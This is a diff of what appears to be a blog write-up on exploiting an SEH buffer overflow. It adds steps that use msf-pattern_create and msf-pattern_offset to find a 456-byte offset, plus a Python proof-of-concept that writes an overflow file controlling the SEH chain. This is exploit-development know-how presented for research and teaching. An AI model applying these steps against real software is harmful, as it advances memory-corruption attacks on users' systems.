@@ -39,15 +39,48 @@ f.close()
 
 ![](/assets/img/Findings11/4.png)
 
+###### Creating a parameter with msf-pattern_create
 
+```term
+root@whitecr0wz:~# msf-pattern_create -l 500 
+...
+```
+
+##### This pattern is pasted into the parameter "Name".
 
 ![](/assets/img/Findings11/5.png)
 
+##### Response of the SEH Chain II
+
 ![](/assets/img/Findings11/6.png)
+
+##### Obtaining the offset with the use of msf-pattern_offset.
+
+```term
+root@whitecr0wz:~# msf-pattern_offset -q 41327041 
+[*] Exact match at offset 456
+root@whitecr0wz:~# 
+```
+
+###### Current PoC:
+
+```term
+import struct
+
+buffer = "A" * 456 + "BBBB" + "CCCC"
+
+f = open ("poc.txt", "w")
+f.write(buffer)
+f.close()
+```
+
+##### Response of the SEH Chain III
 
 ![](/assets/img/Findings11/7.png)
 
-![](/assets/img/Findings11/28.png)
+##### Enumerating the modules.
+
+![](/assets/img/Findings11/8.png)
 
 
 ![](/assets/img/Findings11/11-proof.gif)
